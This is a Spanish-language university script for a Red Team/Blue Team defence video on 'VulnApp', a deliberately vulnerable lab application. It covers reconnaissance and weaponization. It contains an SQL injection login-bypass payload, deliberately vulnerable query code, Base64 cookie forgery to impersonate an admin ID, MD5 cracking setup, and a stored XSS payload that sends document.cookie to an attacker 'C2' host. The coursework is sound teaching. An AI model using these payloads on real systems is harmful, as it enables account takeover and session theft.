# 🎬 Guión Técnico y Narrativo — Video de Defensa del Proyecto VulnApp

> **Universidad Católica Andrés Bello · Facultad de Ingeniería · Ciberseguridad**  
> **Asignatura:** Ciberseguridad · **Profesora:** Francis Ferrer  
> **Proyecto:** VulnApp — Simulación Red Team / Blue Team  
> **Entorno:** VirtualBox Host-Only (`192.168.56.10` Kali Linux Atacante / `192.168.56.20` Ubuntu Server Víctima)

---

## 📌 ESTRUCTURA DEL GUIÓN (FASE RED TEAM)

---

### 🟢 FASE I: RECONOCIMIENTO (Reconnaissance)
**Objetivo:** Identificar la superficie de ataque del servidor expuesto, mapear dinámicamente sus endpoints de API y descubrir deficiencias estructurales en las cabeceras de gestión de sesión HTTP sin realizar inyecciones ni modificaciones activas en la base de datos.

#### 1.1 Enumeración Activa de Endpoints con `ffuf`

* **Comando a ejecutar en Kali Linux:**
  ```bash
  ffuf -u http://192.168.56.20:4000/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,401,403,405 -t 10
  ```

* **Acción en Pantalla:**
  Se muestra la consola de Kali ejecutando `ffuf`. En cuestión de segundos se aprecian los códigos de respuesta HTTP `200` y `401` revelando los recursos `/api/login`, `/api/register`, `/api/profile`, `/api/search` y `/api/message`.

* **Narrativa en el Video (Voz en off / Estudiante):**
  > *"Damos inicio a la Fase I de la metodología Cyber Kill Chain: Reconocimiento. En lugar de emplear escáneres masivos automatizados prohibidos por la norma del laboratorio, utilizamos la herramienta de fuzzing de alto rendimiento `ffuf`. Mediante peticiones HTTP GET y POST controladas hacia la dirección IP de la víctima (192.168.56.20 en puerto 4000), analizamos los códigos de estado devueltos para mapear la superficie de ataque expuesta. Logramos identificar con precisión los endpoints neurálgicos de la API de la aplicación: `/api/login`, `/api/register`, `/api/search` y `/api/message`."*

---

#### 1.2 Registro e Inicio de Sesión Legítimo (Comprobación de Cabeceras)

* **Comando 1 (Registro de usuario de prueba):**
  ```bash
  curl -i -X POST http://192.168.56.20:4000/api/register \
       -H "Content-Type: application/json" \
       -d '{"username": "usuario_prueba", "password": "password123"}'
  ```

* **Comando 2 (Autenticación e inspección de cabeceras HTTP):**
  ```bash
  curl -i -X POST http://192.168.56.20:4000/api/login \
       -H "Content-Type: application/json" \
       -d '{"username": "usuario_prueba", "password": "password123"}'
  ```

* **Acción en Pantalla:**
  Se resalta en la terminal la línea de cabecera de respuesta HTTP:  
  `Set-Cookie: session=eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoidXN1YXJpb19wcnVlYmEiLCJyb2xlIjoidXNlciJ9; Path=/`

* **Narrativa en el Video:**
  > *"Tras identificar los puntos de entrada, simulamos una interacción legítima registrando y autenticando un usuario base. Al utilizar la bandera `-i` en `curl` para inspeccionar la respuesta del servidor Express.js, capturamos la cabecera `Set-Cookie`. Observamos que la aplicación emite una galleta de sesión llamada `session` compuesta por una cadena de caracteres alfanuméricos terminados aparentemente en un formato codificado."*

---

#### 1.3 Análisis Profundo de la Cookie (Descubrimiento de CWE-311 y CWE-345)

* **Comando a ejecutar en Kali Linux:**
  ```bash
  echo "eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoidXN1YXJpb19wcnVlYmEiLCJyb2xlIjoidXNlciJ9" | base64 -d
  ```

* **Resultado en Pantalla:**
  `{"userId":2,"username":"usuario_prueba","role":"user"}`

* **Narrativa en el Video (Sustento Teórico Profundo):**
  > *"Al someter dicha cadena a una decodificación nativa en texto plano con `base64 -d`, confirmamos un hallazgo crítico dentro de la categoría **OWASP A04:2025 - Fallas Criptográficas**:*  
  > *1. **CWE-311 (Falta de Cifrado de Datos Sensibles):** La aplicación almacena el objeto de sesión del usuario (`userId`, `username` y `role`) directamente en texto plano codificado únicamente en Base64, el cual es una representación de codificación y no un esquema de cifrado.*  
  > *2. **CWE-345 (Verificación Insuficiente de Autenticidad de Datos):** La cookie carece completamente de un código de autenticación de mensajes basado en hash (HMAC) o firma digital. Esto demuestra que la integridad de la sesión recae únicamente en el cliente, permitiendo que un vector de ataque pueda adulterar estos campos en la siguiente fase.*  
  > *Con esto concluye la Fase de Reconocimiento, habiendo mapeado la superficie de ataque y aislado las fallas de diseño de la aplicación."*

---

### 🟡 FASE II: ARMAMENTO (Weaponization)
**Objetivo:** Diseñar, calibrar y empaquetar los vectores de ataque (payloads) en la máquina del atacante (Kali Linux) sin enviarlos aún al servidor objetivo. Se justifica teóricamente cómo la lógica interna del backend en Node.js/SQLite condiciona el diseño de cada exploit.

---

#### 2.1 Calibración del Payload de Inyección SQL (CWE-89 / OWASP A05:2025)

* **Acción en Pantalla:**
  Abrir en pantalla la herramienta de texto o la consola mostrando el archivo `payload.json` creado o el documento `PAYLOADS_REFERENCIA.txt`. Mostrar brevemente el fragmento de código vulnerable en `vulnerable/server.js`:
  ```javascript
  const query = `
    SELECT id, username, role, email, password
    FROM users
    WHERE username = '${username}'
    AND   password = '${md5(password)}'
  `;
  ```

* **Comando de preparación en Kali:**
  ```bash
  cat << 'EOF' > payload_sqli.json
  {"username": "' OR 1=1 OR '1'='1", "password": "x"}
  EOF
  cat payload_sqli.json
  ```

* **Narrativa en el Video (Explicación Teórica y Técnica Definitiva):**
  > *"Entramos a la Fase II: Armamento. En esta etapa preparamos los payloads específicos para explotar las vulnerabilidades identificadas.*  
  > *Para la vulnerabilidad **OWASP A05:2025 Inyección (CWE-89: SQL Injection)** en el endpoint `/api/login`, analizamos la construcción de la consulta en el backend. El servidor procesa la petición mediante concatenación directa de variables dentro de un Template Literal multilínea en JavaScript.*  
  > *Un vector de inyección SQL clásico que emplee comentarios de línea como `--` o `/*` resulta ineficaz en esta arquitectura, debido a que el caracter de salto de línea interrumpe el alcance del comentario, dejando activa la línea inferior donde se valida la contraseña con `AND password = ...`.*  
  > *Por esta razón, diseñamos un payload de **lógica booleana pura**: `' OR 1=1 OR '1'='1`. Al inyectar esta secuencia dentro de la variable `username`, la consulta SQL resultante en la base de datos SQLite se transforma en:*  
  > `WHERE username = '' OR 1=1 OR '1'='1 AND password = '...'`  
  > *Dado que la proposición `1=1` es una tautología matemática (siempre verdadera), la evaluación lógica completa de la cláusula `WHERE` devuelve `TRUE` sin necesidad de comentar el resto de la sentencia, garantizando la evasión del control de autenticación."*

---

#### 2.2 Armamento para el Ataque de Cookie Tampering (CWE-345 / OWASP A04:2025)

* **Acción en Pantalla:**
  En la terminal de Kali, construir la estructura del JSON manipulado y mostrar cómo se codifica en Base64 localmente antes de enviarlo.

* **Comandos de preparación en Kali:**
  ```bash
  # Estructura del payload JSON adulterado para suplantar al ID 1 (Admin)
  echo -n '{"userId":1,"username":"usuario_prueba","role":"user"}' | base64 -w 0
  ```

* **Narrativa en el Video:**
  > *"Para la explotación de la **Falla Criptográfica (CWE-345)**, empaquetamos el vector de suplantación de sesión. Tomando la estructura JSON identificada en la Fase I, alteramos el identificador único del usuario (`userId`) cambiando el valor `2` (usuario estándar) por `1` (correspondiente al primer usuario o administrador del sistema).*  
  > *Re-codificamos esta estructura adulterada en Base64 utilizando la herramienta nativa de terminal. Dado que el servidor carece de mecanismos de firma HMAC para verificar la integridad del payload, este paquete queda listo para ser inyectado en la cabecera HTTP `Cookie: session=...` durante la fase de entrega."*

---

#### 2.3 Preparación de la Suite de Cracking MD5 (CWE-327 / CWE-759 / CWE-916)

* **Acción en Pantalla:**
  Mostrar el archivo de diccionario `rockyou.txt` o la sintaxis del comando `hashcat` preparado en pantalla.

* **Comando a mostrar en terminal Kali:**
  ```bash
  ls -lh /usr/share/wordlists/rockyou.txt
  hashcat --help | grep -E "\-m 0"
  ```

* **Narrativa en el Video:**
  > *"Para vulnerar la confidencialidad de las credenciales de la base de datos, preparamos la fase de análisis criptoanalítico contra **CWE-327 (Uso de Algoritmo Criptográfico Obsoleto MD5)**, **CWE-759 (Hash Unidireccional sin Sal/Salt)** y **CWE-916 (Esfuerzo Computacional Insuficiente)**.*  
  > *Debido a que las contraseñas se almacenan mediante el algoritmo MD5 sin aplicar sal estocástica (salt), el proceso de derivación de claves es estrictamente determinista. Esto nos permite armar la herramienta `Hashcat` en la máquina atacante Kali Linux con el modo `-m 0` (MD5 puro) y el diccionario estandarizado `rockyou.txt` para llevar a cabo un ataque de colisión por preimagen en tiempo récord."*

---

#### 2.4 Armamento del Gusano Stored XSS Autorreplicante (CWE-79 / CWE-116)

* **Acción en Pantalla:**
  Mostrar el script de payload XSS preparado en `PAYLOADS_REFERENCIA.txt` o en el archivo `red-team/04_xss_worm_payload.py`.

* **Código del Payload en Pantalla:**
  ```html
  <script>
  (async function(){
    fetch('http://192.168.56.10:8888/?c='+encodeURIComponent(document.cookie),{mode:'no-cors'});
  })();
  </script>
  ```

* **Narrativa en el Video:**
  > *"Finalmente, armamos el vector de ataque para la categoría **OWASP A05:2025 Stored XSS (CWE-79: Cross-Site Scripting)**. Diseñamos un payload en JavaScript asíncrono que aprovecha la renderización insegura mediante `innerHTML` en el cliente (CWE-116).*  
  > *El script preparado ejecutará dos acciones simultáneas al ser interpretado por la víctima: primero, extraerá el contenido del objeto `document.cookie` y lo enviará silenciosamente vía HTTP GET hacia nuestro servidor de Comando y Control (C2) a la IP `192.168.56.10:8888`. Segundo, propagará automáticamente este vector enviando un mensaje a los demás usuarios de la plataforma."*

---

## 📊 RESUMEN DE MAPEO METODOLÓGICO

| Fase CKC | Vulnerabilidad Mapeada | CWE Asociados | Herramientas Utilizadas |
|---|---|---|---|
| **Fase I: Reconocimiento** | Superficie de API & Cookies Base64 | CWE-311, CWE-345 | `ffuf`, `curl -i`, `base64 -d` |
| **Fase II: Armamento** | SQLi, Cookie Tampering, MD5, XSS | CWE-89, CWE-327, CWE-759, CWE-916, CWE-79, CWE-116 | `payload_sqli.json`, `Hashcat`, `Base64 CLI`, Script JS XSS |

---
